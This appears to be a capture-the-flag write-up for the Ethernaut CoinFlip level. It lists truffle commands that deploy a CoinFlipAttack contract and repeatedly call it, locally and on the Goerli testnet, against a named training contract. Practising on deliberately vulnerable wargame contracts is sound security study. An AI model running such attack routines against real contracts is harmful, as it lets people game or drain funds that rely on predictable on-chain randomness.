# CoinFlip

[CoinFlip](https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2)


## Testing Attack

```BASH
truffle develop
```

```JS
migrate
attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: accounts[1]})
(await attack.fail()).toString()
(await attack.success()).toString()
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```


```JS
// Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

migrate

attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: sender})
(await attack.fail()).toString()
(await attack.success()).toString()

flip = await CoinFlip.at('0xA737b256ed909Fd726Ef5E59793fd9A60D516D23')
(await flip.consecutiveWins()).toString()
```

